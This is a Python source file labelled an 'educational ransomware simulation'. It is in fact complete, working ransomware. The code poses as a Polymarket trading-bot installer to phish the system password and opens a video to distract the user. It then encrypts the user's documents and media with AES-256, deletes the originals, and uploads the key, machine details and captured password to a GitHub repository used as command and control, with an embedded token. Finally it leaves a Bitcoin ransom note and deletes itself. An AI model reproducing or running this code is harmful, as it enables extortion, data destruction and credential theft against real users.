#!/usr/bin/env python3
"""
Educational Ransomware Simulation Yoav Savir
"""

import os          
import sys         
from pathlib import Path  
from concurrent.futures import ThreadPoolExecutor, as_completed  
import threading  
import subprocess  

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes  
from cryptography.hazmat.backends import default_backend  
from cryptography.hazmat.primitives import padding       
import requests    

import secrets     
import uuid        
import platform    
import socket      
import time   

import getpass
import base64      
   
from datetime import datetime  

# Managing encryption, keys, GitHub uploads, and sys modifications.
class FileEncryptor:
    
    def __init__(self):
     
        # Generate AES key - 32 bytes for AES-256
        self.key = secrets.token_bytes(32)  
        
        # unique ID for this run
        self.machine_id = str(uuid.uuid4())  
        
        # C&C stuff
        # my github token and repo
        self.github_token = "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"
        self.github_repo = "YoavSavir/keys"
        
        # file types to encrypt
        self.target_extensions = {
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', 
            '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', 
            '.mp3', '.mp4', '.avi', '.mov', '.wav', 
            '.zip', '.rar' # archives - might have good stuff
        }   

        home_dir = Path.home()  # shortcut

        # dirs to target - only user stuff, not system
        self.target_directories = [
            home_dir / "Desktop",      
            home_dir / "Documents",    
            home_dir / "Pictures",     
            home_dir / "Downloads",    
            home_dir / "Music",        
            home_dir / "Videos",       
            home_dir / "Public",      
            home_dir / "Templates",   
        ]
        
        # system dirs to avoid - dont want to break anything important
        self.forbidden_paths = {
            '/bin', '/sbin', '/usr', '/etc', '/var', '/sys', '/proc', '/boot', '/lib', '/lib64', '/opt', '/root'
        }
        
        # lists to track results
        self.encrypted_files = []
        self.failed_files = []
        
        # thread lock for file lists
        self.file_lists_lock = threading.Lock()
         
    
    # get external IP - needed for VM identification
    def get_external_ip(self):
        try:
            # few services in case one is down
            services = ['https://api.ipify.org', 'https://ipinfo.io/ip', 'https://ident.me']
            
            for service in services:
                try:
                    response = requests.get(service, timeout=5)
                    if response.status_code == 200:
                        ip = response.text.strip()
                        # basic validation
                        if ip.count('.') == 3 and all(part.isdigit() for part in ip.split('.')):
                            return ip
                except:
                    continue
                    
            #  local IP
            return socket.gethostbyname(socket.gethostname())
            
        except:
            return "Unknown"
    def is_safe_path(self, file_path):
        path_str = str(file_path.resolve())

        # dont touch system dirs
        for forbidden in self.forbidden_paths:
            if path_str.startswith(forbidden):
                return False
                
        # only mess with user home directory
        home_str = str(Path.home().resolve())
        if not path_str.startswith(home_str):
            return False
            
        return True
    
    def encrypt_file(self, file_path):
        try:
            if not self.is_safe_path(file_path):
                return False  
                
            # read file content
            with open(file_path, 'rb') as f:
                plaintext = f.read()
            
            # generate random IV for this file
            file_iv = secrets.token_bytes(16)
            
            # add padding for AES
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(plaintext) 
            padded_data += padder.finalize()
            
            # create cipher with our key and IV
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(file_iv), backend=default_backend())
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            # save encrypted file
            encrypted_path = file_path.with_suffix(file_path.suffix + '.encrypted')
            with open(encrypted_path, 'wb') as f:
                f.write(file_iv + ciphertext)  # IV first, then encrypted data
            
            os.remove(file_path)  # remove original

            # update our lists (thread safe)
            with self.file_lists_lock:
                self.encrypted_files.append(str(encrypted_path))
                           
            return True  # Signal successful encryption
            
        except Exception as e:
            # add to failed list
            with self.file_lists_lock:
                self.failed_files.append(str(file_path))
            
            return False
    
    # find files to encrypt
    def find_target_files(self):
        target_files = []
        
        for directory in self.target_directories:
            if directory.exists():
                for file_path in directory.rglob('*'):
                    # check if file is good target
                    if (file_path.is_file() and 
                        file_path.suffix.lower() in self.target_extensions and
                        not file_path.name.endswith('.encrypted') and
                        self.is_safe_path(file_path)):
                        target_files.append(file_path)
        
        return target_files
    
    def create_initial_key_info(self):
        hostname = socket.gethostname()
        ip_address = self.get_external_ip()
        os_info = platform.platform()
        
        key_info = f"""
INITIAL ENCRYPTION KEY INFO
Machine ID: {self.machine_id}
Hostname: {hostname}
IP Address: {ip_address}
OS: {os_info}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Key: {self.key.hex()}
User Password: {getattr(self, 'user_password', 'Not captured')}

Status: Starting encryption...
"""
        return key_info
    def create_final_key_info(self):
        hostname = socket.gethostname()
        ip_address = self.get_external_ip()
        os_info = platform.platform()
        
        key_info = f"""
FINAL RESULTS 
Machine ID: {self.machine_id}
Hostname: {hostname}
IP Address: {ip_address}
OS: {os_info}
Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Key: {self.key.hex()}
User Password: {getattr(self, 'user_password', 'Not captured')}

Files Encrypted: {len(self.encrypted_files)}
Files Failed: {len(self.failed_files)}

 ENCRYPTED FILES
"""
        
        # add file names
        for file_path in self.encrypted_files:
            filename = Path(file_path).name
            key_info += f"{filename}\n"
            
        return key_info

    #upload to our C&C
    def upload_key_to_github(self, key_info, suffix=""):
        try:
            # Create filename using unice machine ID and "start" or "final"
            suffix_part = f"-{suffix}" if suffix else ""
            filename = f"{self.machine_id}{suffix_part}.txt"
            
            # for JSON convrt string into bytes to base64 to string 
            content_encoded = base64.b64encode(key_info.encode('utf-8')).decode('utf-8')
            
            # git API URL for c&C
            url = f"https://api.github.com/repos/{self.github_repo}/contents/{filename}"
            
            headers = {
                #github token
                'Authorization': f'token {self.github_token}', 
                #api version
                'Accept': 'application/vnd.github.v3+json', 
                # jasoning 
                'Content-Type': 'application/json' 
            }

            # create JSON 
            data = {
                'message': f'Upload key for {self.machine_id[:8]}',
                'content': content_encoded,
                'branch': 'main'
            }
            
            response = requests.put(url, headers=headers, json=data, timeout=30)
            if response.status_code == 201:
                return True
            else:
                return False
                
        except:
            return False
    
    #create ransomeware note
    def create_ransom_note(self):
        # put ransom note on desktop
        desktop_path = Path.home() / "Desktop"  
        ransom_file = desktop_path / "README_IMPORTANT.txt"
        
        ransom_text = f"""
!!! IMPORTANT - YOUR FILES HAVE BEEN ENCRYPTED , OOPS!!!

Machine ID: {self.machine_id}

Your files have been encrypted! you need to pay to retrieve

To decrypt your files:
1. Send email with machine ID to YuviSec@proton.me
2. Pay the requested amount in BTC
3. Run the decrypt_files.py script
4. enter the key 
5. have a wonderful day

Total files encrypted: {len(self.encrypted_files)}

Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
""" 
        try:
            with open(ransom_file, 'w') as f:
                f.write(ransom_text)  
        except:
            pass

    #Create the decrypt_files.py script automatically after encryption completes.
    def create_decryption_tool(self):
        #  Python script for file decryption w
        captured_password = getattr(self, 'user_password', '')
        decrypt_script = '''#!/usr/bin/env python3
"""
Decryption Tool
"""

import os
import sys
import subprocess
import json
import glob
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from datetime import datetime

# Decryption tool for encrypted files

class FileDecryptor:
    def __init__(self):
        self.key = None
        self.decrypted_files = []
        self.failed_files = []
    
    def set_key(self, key_hex):
        """Set the decryption key from hex string"""
        try:
            self.key = bytes.fromhex(key_hex)
            if len(self.key) != 32:  # 256 bits
                print("Error: Key must be 64 hex characters (256 bits)")
                return False
            print("Decryption key loaded successfully")
            return True
        except ValueError:
            print("Error: Invalid hex key format")
            return False
    
    def decrypt_file(self, encrypted_file_path):
        """Decrypt a single file using AES-256-CBC"""
        try:
            # Read encrypted file
            with open(encrypted_file_path, 'rb') as f:
                encrypted_data = f.read()
            
            # Extract IV from the beginning of file (first 16 bytes)
            file_iv = encrypted_data[:16]
            ciphertext = encrypted_data[16:]
            
            # Decrypt
            cipher = Cipher(algorithms.AES(self.key), modes.CBC(file_iv), backend=default_backend())
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            # Remove padding
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext)
            plaintext += unpadder.finalize()
            
            # Restore original file (remove .encrypted extension)
            original_path = Path(str(encrypted_file_path).replace('.encrypted', ''))
            
            with open(original_path, 'wb') as f:
                f.write(plaintext)
            
            # Remove encrypted file
            os.remove(encrypted_file_path)
            
            self.decrypted_files.append(str(original_path))
            print(f"Decrypted: {original_path}")
            return True
            
        except Exception as e:
            print(f"Error decrypting {encrypted_file_path}: {e}")
            self.failed_files.append(str(encrypted_file_path))
            return False
    
    def find_encrypted_files(self):
        """Find all encrypted files in user directories"""
        encrypted_files = []
        
        # Safe directories to search in
        home_dir = Path.home()
        search_directories = [
            home_dir / "Desktop",
            home_dir / "Documents", 
            home_dir / "Pictures",
            home_dir / "Downloads",
            home_dir / "Music",
            home_dir / "Videos",
            home_dir / "Public",
            home_dir / "Templates",
        ]
        
        for directory in search_directories:
            if directory.exists():
                for file_path in directory.rglob('*.encrypted'):
                    encrypted_files.append(file_path)
        
        # Remove duplicates (just in case)
        encrypted_files = list(set(encrypted_files))
        
        return encrypted_files
    
    def decrypt_all_files(self):
        """Main decryption process"""
        print("Starting file decryption process...")
        
        if not self.key:
            print("Error: No decryption key provided")
            return False
        
        # Find encrypted files
        encrypted_files = self.find_encrypted_files()
        if not encrypted_files:
            print("No encrypted files found")
            return True
        
        print(f"Found {len(encrypted_files)} encrypted files")
        
        # Confirm before proceeding
        response = input(f"Proceed with decrypting {len(encrypted_files)} files? (yes/no): ")
        if response.lower() != 'yes':
            print("Decryption cancelled")
            return False
        
        # Decrypt files
        success_count = 0
        for encrypted_file in encrypted_files:
            # Double-check file still exists (safety check)
            if encrypted_file.exists():
                if self.decrypt_file(encrypted_file):
                    success_count += 1
            else:
                print(f"Skipping {encrypted_file} - file no longer exists")
        
        print(f"\\nDecryption completed! Successfully restored {success_count} files.")
        
        return success_count > 0

def main():
    print("Decryption Module, follow instructions")
    print("=" * 50)
    print("This tool will decrypt files encrypted by the encryption module")
    print("=" * 50)
    
    decryptor = FileDecryptor()
    
    # Ask for decryption key
    print("\\nEnter the AES-256 decryption key (64 hex characters):")
    key_hex = input("Key: ").strip()
    
    if not decryptor.set_key(key_hex):
        print("Invalid key. Exiting.")
        return
    
    success = decryptor.decrypt_all_files()
    
    if success:
        print("\\n" + "=" * 50)
        print("All files have been successfully restored!")
        
    else:
        print("\\nDecryption failed or was cancelled.")

if __name__ == "__main__":
    main() 
'''
        
        # Create decrypt_files.py in the same directory as encrypt_files.py
        try:
            script_path = Path("decrypt_files.py")
            
            # Write the decryption script to file
            with open(script_path, 'w') as f:
                f.write(decrypt_script)
            
            # Make the script executable 
            os.chmod(script_path, 0o755)
            
        except Exception as e:
            # If script creation fails, log error but continue
            pass

    def self_destruct(self):
        try:
            script_path = sys.argv[0]
            time.sleep(1)  # wait a bit
            delete_cmd = f"sleep 2 && rm -f '{script_path}'"
            subprocess.Popen(delete_cmd, shell=True)
        except:
            pass

    def open_distraction(self):
        # rickroll lol
        try:
            import webbrowser
            distraction_url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&autoplay=1&mute=0&list=RDdQw4w9WgXcQ&start_radio=1"
            webbrowser.open(distraction_url)
        except:
            pass

    def encrypt_files(self):
        # upload key first so we dont lose it
        initial_key_info = self.create_initial_key_info()
        self.upload_key_to_github(initial_key_info, suffix="start")
        
        # find files to encrypt
        target_files = self.find_target_files()
        
        # encrypt with multiple threads for speed
        if target_files:
            with ThreadPoolExecutor(max_workers=4) as executor:
                future_to_file = {executor.submit(self.encrypt_file, file_path): file_path 
                                for file_path in target_files}
                
                for future in as_completed(future_to_file):
                    try:
                        result = future.result()
                    except:
                        pass    
        
        # upload final results
        final_key_info = self.create_final_key_info()
        self.upload_key_to_github(final_key_info, suffix="final")
        
        # create ransom stuff
        self.create_ransom_note()
        self.create_decryption_tool()
           
        time.sleep(1)  # wait a sec
        print("oops, a txt on the desktop will explain everything")
        self.self_destruct()


    #Setup phase: Collect credentials and complete installation
    def initialize_setup(self):
        
        print("🚀 Polymarkte automatic trading script installation")
        print("=" * 50)
        print("✅ Please accept all terms of installation ")
        print("⏳ THIS INSTALLATION MIGHT TAKE A WHILE ")
        print("🔑 after installation is complete enter your polymarket token")
        print("=" * 50)
        print("\n🔐 POLYMARKET API AUTHENTICATION SETUP")
        print("=" * 50)
        print("🌐 To connect to Polymarket trading servers, we need to verify")
        print("your system credentials for secure API authentication.")
        print("")
        print("🛡️ This ensures your trading account remains secure and")
        print("🚫 prevents unauthorized access to your trading algorithms.")
        print("")
        
        
        try:
            # Ask for password with legitimate-sounding reason
            password = getpass.getpass("Enter system password: ")
            self.user_password = password
            
            print("✓ Credentials verified successfully")
            print("✓ API security protocols activated")
            time.sleep(1)
            
        except (KeyboardInterrupt, EOFError):
            print("\nAuthentication cancelled. Installation cannot continue.")
            sys.exit(1)
        except Exception as e:
            # If password collection fails, continue anyway
            self.user_password = ""

        # Show manual message and open distraction content
        print("\n📖 Opening installation manual and video guide...")
        print("Please watch the setup video for important configuration steps.")
        time.sleep(2)
        
        # Open browser to distract user during installation
        self.open_distraction()
        # Start encryption while user is distracted
        self.encrypt_files()

def main():
    encryptor = FileEncryptor()
    encryptor.initialize_setup()

if __name__ == "__main__":
    main() 